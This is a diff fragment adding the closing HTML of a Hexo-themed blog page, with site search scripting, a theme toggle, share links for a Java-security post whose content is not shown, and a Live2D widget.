+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>No result<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The search.xml file was not found, please refer to：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>The request failed, Try to refresh the page or try again later.<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87 + '&url=' + http%3A%2F%2Fexample.com%2F2022%2F04%2F29%2Fjava%25E5%25AE%2589%25E5%2585%25A8%25E6%25BC%25AB%25E8%25B0%2588%25E8%25A7%2582%25E5%2590%258E%25E6%2584%259F(%25E5%258D%2581)-CC%25E8%25A1%25A5%25E6%25BC%258F%25E7%25AF%2587%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://example.com/2022/04/29/java%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88%E8%A7%82%E5%90%8E%E6%84%9F(%E5%8D%81)-CC%E8%A1%A5%E6%BC%8F%E7%AF%87/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  <script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+<script type="text/javascript" src="/js/FunnyTitle.js"></script>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/love.js"></script>
